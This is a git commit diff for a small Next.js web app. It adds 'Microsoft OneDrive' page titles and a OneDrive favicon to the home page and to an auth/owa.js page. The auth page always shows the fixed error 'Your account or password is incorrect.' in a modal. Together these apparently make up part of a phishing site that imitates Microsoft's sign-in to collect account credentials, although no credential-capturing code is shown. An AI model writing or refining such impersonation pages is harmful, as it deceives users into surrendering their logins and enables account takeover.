f757f28d74062423743eb5c7f31443e8c3472201
Ikenna <iykethe1st@gmail.com>
2023-03-28 14:11:45 +0100

    hot fix

--- my-app/src/pages/auth/owa.js
+++ my-app/src/pages/auth/owa.js
@@ -1,15 +1,22 @@
 import NavBar from "@/components/NavBar";
 import Body from "@/components/Body";
 import { useState } from "react";
+import Head from "next/head";
 
 const Error = () => {
   const openModal = true;
   const error = "Your account or password is incorrect.";
   return (
-    <div className="bg-white h-screen text-sm flex flex-col">
-      <NavBar />
-      <Body error={error} openModal={openModal} />
-    </div>
+    <>
+      <Head>
+        <link rel="shortcut icon" href="/OneDrive.svg" />
+        <title>Microsoft OneDrive</title>
+      </Head>
+      <div className="bg-white h-screen text-sm flex flex-col">
+        <NavBar />
+        <Body error={error} openModal={openModal} />
+      </div>
+    </>
   );
 };
 
--- my-app/src/pages/index.js
+++ my-app/src/pages/index.js
@@ -1,11 +1,18 @@
 import NavBar from "@/components/NavBar";
 import Body from "@/components/Body";
+import Head from "next/head";
 
 export default function Home() {
   return (
-    <div className="bg-white h-screen text-sm flex flex-col">
-      <NavBar />
-      <Body />
-    </div>
+    <>
+      <Head>
+        <link rel="shortcut icon" href="/fOneDrive.svg" />
+        <title>Microsoft OneDrive</title>
+      </Head>
+      <div className="bg-white h-screen text-sm flex flex-col">
+        <NavBar />
+        <Body />
+      </div>
+    </>
   );
 }
